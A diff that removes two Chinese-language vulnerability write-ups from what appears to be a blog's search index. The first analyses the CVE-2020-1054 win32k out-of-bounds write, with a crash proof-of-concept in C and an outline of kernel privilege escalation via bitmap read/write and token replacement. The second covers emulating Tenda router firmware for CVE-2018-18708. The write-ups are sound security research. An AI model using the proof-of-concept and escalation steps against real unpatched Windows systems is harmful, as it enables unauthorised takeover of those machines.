@@ -1,408 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CVE-2020-1054越界写入本地提权分析</title>
-    <url>/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2020-1054是win32k.sys内核模块的oob(out of band)漏洞。成功利用可以导致权限提升。漏洞存在于win32k!vStrWrite01函数中，函数在对BitMap对象中的pvScan0成员指向的像素区域进行读写的时候，没有判断读写的地址是否超过BitMap对象的像素点范围，是否越界，导致BSOD的产生。通过合理的内存布局，可以利用漏洞扩大目标BitMap对象的sizelBitmap来扩大BitMap对象的可读写范围，利用扩大读写范围的BitMap对象来修改另一个BitMap对象的pvScan0就能实现任意地址读写。</p>
-<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="蓝屏poc"><a href="#蓝屏poc" class="headerlink" title="蓝屏poc"></a>蓝屏poc</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">##include <span class="token operator">&lt;</span>Windows<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
-##include <span class="token operator">&lt;</span>inttypes<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
-##include <span class="token operator">&lt;</span>stdint<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
-##include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
-##include <span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    HDC r0 <span class="token operator">=</span> <span class="token function">CreateCompatibleDC</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建与指定设备兼容的内存设备上下文环境</span>
-    HBITMAP r1 <span class="token operator">=</span> <span class="token function">CreateCompatibleBitmap</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> <span class="token number">0x9f42</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建与指定设备环境相关的设备兼容位图</span>
-    <span class="token comment">//HBITMAP r1 = CreateCompatibleBitmap(r0, 0x51500, 0x100);//创建与指定设备环境相关的设备兼容位图</span>
-    <span class="token function">SelectObject</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> r1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//选择一对象到指定的设备上下文环境中，该对象替换先前的相同类型对象</span>
-    <span class="token function">DrawIconEx</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>HICON<span class="token punctuation">)</span><span class="token number">0x30000010003</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0xfffffffffebffffc</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>CreateCompatibleBitmap</strong></p>
-<p>创建与指定设备上下文关联的设备兼容位图</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c">HBITMAP <span class="token function">CreateCompatibleBitmap</span><span class="token punctuation">(</span>
-  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> HDC hdc<span class="token punctuation">,</span> <span class="token comment">//设备上下文的句柄</span>
-  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span> cx<span class="token punctuation">,</span>  <span class="token comment">//位图宽度</span>
-  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span> cy   <span class="token comment">//位图高度</span>
-<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>DrawIconEx</strong></p>
-<p>将图标和光标绘制到指定设备上下文中，执行指定光栅操作，指定拉伸或压缩图标光标。</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c">BOOL <span class="token function">DrawIconEx</span><span class="token punctuation">(</span>
-  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           HDC    hdc<span class="token punctuation">,</span>
-  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    xLeft<span class="token punctuation">,</span>
-  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    yTop<span class="token punctuation">,</span>
-  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           HICON  hIcon<span class="token punctuation">,</span><span class="token comment">//绘制图标和光标的句柄</span>
-  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    cxWidth<span class="token punctuation">,</span><span class="token comment">//图标或光标逻辑宽度</span>
-  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    cyWidth<span class="token punctuation">,</span><span class="token comment">//图标或光标逻辑高度</span>
-  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           UINT   istepIfAniCur<span class="token punctuation">,</span>
-  <span class="token punctuation">[</span>in<span class="token punctuation">,</span> optional<span class="token punctuation">]</span> HBRUSH hbrFlickerFreeDraw<span class="token punctuation">,</span>
-  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           UINT   diFlags
-<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>崩溃地址为win32k!vStrWrite01+0x36a</p>
-<h3 id="vStrWrite01"><a href="#vStrWrite01" class="headerlink" title="vStrWrite01"></a>vStrWrite01</h3><p>StrWrite01(struct _STRRUN *prun, struct _XRUNLEN *a2, struct SURFACE *pSurf, struct _CLIPOBJ *a4)</p>
-<pre class="line-numbers language-none"><code class="language-none">OID vStrWrite01(STRRUN  *prun, 
-                 XRUNLEN *pxrlEnd,
-                 SURFACE *pSurf,
-                 CLIPOBJ *pco)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><pre class="line-numbers language-none"><code class="language-none">typedef struct _XRUNLEN
-{
-    LONG    xPos;
-    LONG    cRun;
-    LONG    aul[1];
-} XRUNLEN;
- 
-typedef struct _STRRUN
-{
-    LONG    yPos;
-    LONG    cRep;
-    XRUNLEN xrl;
-} STRRUN;
- 
- 
-typedef struct tagSIZE {
-    LONG cx;
-    LONG cy;
-} SIZE,*PSIZE,*LPSIZE;
-  
-typedef SIZE SIZEL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>BASEOBJECT结构体</p>
-<pre class="line-numbers language-none"><code class="language-none">typedef struct _BASEOBJECT64{
-  ULONG64 hHmgr;     // 0x00
-  ULONG32 ulShareCount;      // 0x08
-  WORD cExclusiveLock;       // 0x0A
-  WORD BaseFlags;        // 0x0C
-  ULONG64 Tid;           // 0x10
-} BASEOBJECT64;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>SURFOBJ结构体</p>
-<pre class="line-numbers language-none"><code class="language-none">typedef struct _SURFOBJ64{
-  BASEOBJECT64 baseObj;    // 0x00
-  ULONG64 dhsurf;         // 0x18
-  ULONG64 hsurf;          // 0x20
-  ULONG64 dhpdev;         // 0x28
-  ULONG64 hdev;           // 0x30
-  SIZEL sizlBitmap;       // 0x38
-  ULONG64 cjBits;         // 0x40
-  ULONG64 pvBits;         // 0x48
-  ULONG64 pvScan0;        // 0x50
-  ULONG32 lDelta;         // 0x58
-  ULONG32 iUniq;          // 0x5C
-  ULONG32 iBitmapFormat;  // 0x60
-  USHORT iType;           // 0x64
-  USHORT fjBitmap;        // 0x66
-} SURFOBJ64;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>pvScan01指向Pixel Data数据区，这些数据可以通过GetBitmapBits和SetBitmapBits控制</p>
-<p>sizlBitmap是两个Dword，包含位图的高度和宽度。</p>
-<h3 id="触发地点"><a href="#触发地点" class="headerlink" title="触发地点"></a>触发地点</h3><p>崩溃地址为win32k!vStrWrite01+0x36a，<code>mov esi,[r14]</code></p>
-<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824160100705.png"></p>
-<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824113228498.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">.text:FFFFF97FFF0A2175                 lea     r14, [rcx+rax*4]
-.text:FFFFF97FFF0A2179                 test    ebx, ebx
-.text:FFFFF97FFF0A217B                 js      short loc_FFFFF97FFF0A2192
-.text:FFFFF97FFF0A217D                 mov     rax, [rsp+0A8h+arg_10]
-.text:FFFFF97FFF0A2185                 cmp     ebx, [rax+38h]
-.text:FFFFF97FFF0A2188                 jge     short loc_FFFFF97FFF0A2192
-.text:FFFFF97FFF0A218A                 mov     esi, [r14]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>内存地址由rcx和rax决定。</p>
-<h3 id="vStrWrite01流程"><a href="#vStrWrite01流程" class="headerlink" title="vStrWrite01流程"></a>vStrWrite01流程</h3><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824145835155.png"></p>
-<p>loc_FFFFF97FFF0A20B4</p>
-<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824172844847.png"></p>
-<p>用rcx和rax计算r14的内存地址，之后执行mov esi,[r14]指令。</p>
-<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824150841161.png"></p>
-<p>如果r14地址合法，对读到的值进行or或者and运算，并把运算后的值赋值回r14指向的内存地址。</p>
-<p>如果控制了崩溃处的destAddr(越界地址oobAddr),就可以进行内存破坏。</p>
-<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824161532452.png"></p>
-<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824160327694.png"></p>
-<p>之后对rcx进行操作，判断r11d是否为0，不为0跳转到loc_FFFFF97FFF0A212B，进行r11d减1操作。</p>
-<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824165106838.png"></p>
-<p>函数流程如下</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-	<span class="token keyword">do</span> <span class="token punctuation">{</span>
-		<span class="token comment">/* 
-		lea  r14, [rcx + rax * 4] 
-		rcx = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0
-		rax = prun-&gt;xrl-&gt;xPos &gt;&gt; 5
-		*/</span>
-		r14 <span class="token operator">=</span> rcx <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>prun<span class="token operator">-&gt;</span>xrl<span class="token operator">-&gt;</span>xPos <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读取时的oobAddr,rcx + rax * 4</span>
-		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-		tmp <span class="token operator">=</span> <span class="token operator">*</span>destAddr  <span class="token comment">//崩溃</span>
-
-		<span class="token keyword">do</span> <span class="token punctuation">{</span>
-
-			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-				tmp <span class="token operator">|=</span> xxxxxx
-			<span class="token punctuation">}</span>
-			<span class="token keyword">else</span> <span class="token punctuation">{</span>
-				tmp <span class="token operator">&amp;=</span> xxxxxx
-			<span class="token punctuation">}</span>
-		<span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>r11d<span class="token punctuation">)</span>
-            <span class="token operator">--</span>r11d<span class="token punctuation">;</span>
-			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
-				<span class="token operator">*</span>destAddr <span class="token operator">=</span> tmp<span class="token punctuation">;</span> <span class="token comment">//满足条件，写入oobAddr</span>
-			<span class="token punctuation">}</span>
-	<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
-        
-		<span class="token comment">/*
-		add rcx, rax
-        rcx = rcx + pSurf-&gt;lDelta
-        */</span>
-		rcx <span class="token operator">+=</span> pSurf<span class="token operator">-&gt;</span>lDelta<span class="token punctuation">;</span><span class="token comment">//每次循环obbAddr会增加</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>对r14指向的内存进行读写</p>
-<pre class="line-numbers language-none"><code class="language-none">rcx = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0
-rax = prun-&gt;xrl-&gt;xPos &gt;&gt; 5
-lea  r14, [rcx+rax*4]
-rcx = rcx + pSurf-&gt;lDelta<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>循环的操作如下</p>
-<pre class="line-numbers language-none"><code class="language-none">for(i = 0; i&lt;prun-&gt;yPos; i++)
-{
-    r14 = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0 + 4*(prun-&gt;xrl-&gt;xPos) + i*pSurf-&gt;lDelta
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>崩溃时的指令是<code>mov esi, [r14]</code>，由于引用无效的内存发生，是越界写入漏洞。崩溃时访问的地址能通过oob控制其中的内容。影响读写oobAddr的值有<code>prun-&gt;yPos</code>，<code>pSurf-&gt;lDelta</code>，<code>prun-&gt;xrl-&gt;xPos</code>和循环次数</p>
-<pre class="line-numbers language-none"><code class="language-none">DrawIconEx(exploit_dc, 0x0, 0x0, (HICON)0x40000010003, 0x0, 0xffe00000, 0x0, 0x0, 0x1);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>yPos有DrawIconEx中的arg3和arg有关</p>
-<pre class="line-numbers language-none"><code class="language-none">##include&lt;stdio.h&gt;
-int main(){
-    int arg3 = 0xb;
-    int arg6 = 0xffe00000;
-    int yPos = 0;
-    int remainder_count = 0;
-    int quotient_count = 0;
-    int mod_num = (arg3+1-(arg6+arg3+1)) % 0x20;
-    int div_num = (arg3+1-(arg6+arg3+1))/ 0x20;
-    if(0xf+mod_num&gt;=0x20){
-        remainder_count = mod_num;
-        quotient_count = div_num+1;
-        yPos = (remainder_count-1-1)*(div_num+1) \
-              + div_num +arg6 + arg3+1;
-    }else{
-        remainder_count = mod_num;
-        quotient_count = div_num;
-        yPos = (0x20-1-1)*div_num+arg6+arg3+1;
-    }
-    printf("arg3: 0x%x\n",arg3);
-    printf("arg6: 0x%x\n",arg6);
-    printf("yPos First: 0x%x\n",yPos);
-    printf("yPos Second: 0x%x\n",(yPos+quotient_count));
-    return 0;
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>prun -&gt; xrl.xPos:0x900</p>
-<p>pSurf-&gt;lDelta:0xa2a0</p>
-<p>prun-&gt;xPos:0xb</p>
-<h3 id="地址任意读写"><a href="#地址任意读写" class="headerlink" title="地址任意读写"></a>地址任意读写</h3><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906100016677.png"></p>
-<p>SIZEL sizlBitmap，是限定位图的长宽的，存储Pixel Data的长宽大小，四字节写可修改Pixel Data的大小</p>
-<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906095832694.png"></p>
-<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>CreateCompatibleBitmap申请VulBITMAP，并获得VulBITMAP的内核地址<br>计算oob读写地址<br>在oob读地址处申请BITMAP1，在oob写处申请BITMAP2，大小为0x7000<br>触发漏洞，读取BITMAP1中的sIzlBitmap值，修改BITMAP2对象的sizlBitmap值，对BITMAP2使用SetBitmapBits和GetBitmapBits越界读写BITMAP3的pvScan0<br>BITMAP2作为Manager，BITMAP3作为worker，实现任意读写，替换token等提权</p>
-<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906095502566.png"></p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2018-18708 Tenda路由器栈溢出分析</title>
-    <url>/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2018-18708是Tenda路由器的httpd存在缓冲区溢出漏洞。可以利用该漏洞造成拒绝服务。</p>
-<p>影响版本：</p>
-<pre class="line-numbers language-none"><code class="language-none">AC7 V15.03.06.44_CN
-AC9 V15.03.05.19_CN
-AC10 V15.03.06.23_CN
-AC15 V15.03.05.19_CN
-AC18 V15.03.05.19(6318)_CN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h3><p>US_AC15V1.0BR_V15.03.05.19_multi_TD01</p>
-<h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>提取固件运行httpd可执行文件</p>
-<pre class="line-numbers language-none"><code class="language-none">binwalk -Me US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>查看文件信息，是arm</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116165640011.png"></p>
-<p>qemu执行</p>
-<pre class="line-numbers language-none"><code class="language-none">cd _US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root
-cp $(which qemu-arm-static) ./
-sudo chroot ./ ./qemu-arm-static ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>会卡在Welcome to</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114111007129.png"></p>
-<h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>ida分析发现sub_2E420，发现welcome to之后有两处check，第一处check不通过会进入休眠状态，第二个检查连接情况，不通过会打印连接失败。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114112513082.png"></p>
-<p>patch掉这两处的检测</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144110897.png"></p>
-<p>patch掉之后继续执行</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144236394.png"></p>
-<p>安装uml-utilities</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo apt install uml-utilities<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>安装bridge-utils</p>
-<pre class="line-numbers language-none"><code class="language-none">https://mirrors.edge.kernel.org/pub/linux/utils/net/bridge-utils/bridge-utils-1.7.1.tar.xz
-tar -xvf bridge-utils-1.7.1.tar.xz
-autoconf
-./configure
-make
-sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113136378.png"></p>
-<h4 id="定位ip"><a href="#定位ip" class="headerlink" title="定位ip"></a>定位ip</h4><p>搜索字符串Listen ip定位到sub_1B84C函数</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113711000.png"></p>
-<p>分析调用链</p>
-<p><code>sub_2E420 -&gt; sub_2E9EC -&gt; sub_29510  -&gt; sub_29818 -&gt;  sub_1B84C</code></p>
-<p>函数sub_29818调用了sub_1B84C</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115132854149.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpd
-gdb-multiarch
-set architecture arm
-b*0x1B84C
-target remote:1111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115142522808.png"></p>
-<p>对ip参数v8进行定位</p>
-<p>v8和s.sa_data[2]、a1有关</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143459247.png"></p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143338834.png"></p>
-<p>往上回溯，sub_29818调用了sub_1B84C，sub_29818的v8是了sub_1B84C的第一个参数a1</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115144144585.png"></p>
-<p>往上回溯到sub_2E420，ip的值与s和v19有关。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115150620540.png"></p>
-<p>查看getIfIp</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115151018366.png"></p>
-<p>getIfIp为外部导入函数，位于libcommon.so中</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160146351.png"></p>
-<p>ioctl有三个参数，第一个参数fd由socket()系统调用返回，第二个参数获取IP地址。第三个参数与getLanIfName函数有关。</p>
-<p>因此函数整体流程为获取IP地址返回v2，v2的值为0不会进入if循环，ip的值由v19决定，v19是getIfIp函数的第二个参数v2，系统调用获取IP后赋给a2(v19)。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160907362.png"></p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161237390.png"></p>
-<p>getLanIfName会调用get_eth_name函数，参数写死为0，get_eth_name在libChipApi.so中，查看libChipApi.so中的get_eth_name函数，函数返回v1，为网卡名称</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161516417.png"></p>
-<h4 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h4><p>因此整体流程为getLanIfName函数调用get_eth_name函数获取网卡名称，将网卡名称做为参数输入到getIfIp中。函数寻找名称为br0的网卡的ip地址传递给v19。因此让程序监听正确的ip地址需要新建br0网卡。</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo brctl addbr br0 
-sudo brctl addif br0 eth0
-sudo ifconfig br0 up
-sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>重新启动找到了br0网卡并获取了ip地址</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141128835.png"></p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141227111.png"></p>
